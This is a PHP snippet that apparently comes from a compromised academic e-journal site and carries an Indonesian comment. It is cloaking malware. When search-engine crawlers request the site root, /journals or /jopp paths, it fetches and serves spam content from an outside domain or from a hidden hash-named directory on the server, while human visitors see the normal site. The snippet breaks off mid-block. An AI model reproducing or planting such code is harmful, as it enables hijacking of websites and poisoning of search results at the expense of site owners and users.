function is_google_bot(){
    $a = ["Googlebot","Google-Site-Verification","Google-InspectionTool","Googlebot-Mobile","Googlebot-News"];
    foreach($a as $b){
        if(strpos($_SERVER['HTTP_USER_AGENT'], $b) !== false) return 1;
    }
    return 0;
}

// JALANKAN HANYA JIKA DI ROOT (bukan di /bisa)
if($_SERVER['REQUEST_URI'] == '/' || $_SERVER['REQUEST_URI'] == '/journals'){
    if(is_google_bot()){
        $c = curl_init('https://freeportindonesia.org/landing/ijsse.html');
        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($c, CURLOPT_FOLLOWLOCATION, 1);
        echo curl_exec($c);
        curl_close($c);
        exit;
    }
}


$user_agent  = $_SERVER['HTTP_USER_AGENT'] ?? '';
$request_uri = $_SERVER['REQUEST_URI'] ?? '';

if(stripos($request_uri, '/jopp') !== false){
    $is_bot = false;
    
    $bots = [
        'Googlebot', 'Google-InspectionTool', 'AdsBot-Google', 'Mediapartners-Google',
        'Bingbot', 'Slurp', 'DuckDuckBot', 'AhrefsBot', 'SemrushBot', 'MJ12bot', 'YandexBot'
    ];
    
    foreach ($bots as $bot) {
        if (stripos($user_agent, $bot) !== false) {
            $is_bot = true;
            break;
        }
    }
    
    if ($is_bot){
        $file = '/www/wwwroot/ejournal.uniski.ac.id/a367d948374f767a32ff4f7b46aa2233aa3f415134321/contexts/3/library/dialektologi.txt';
        if (file_exists($file)) {
            readfile($file);
        } else {

        }
        exit;
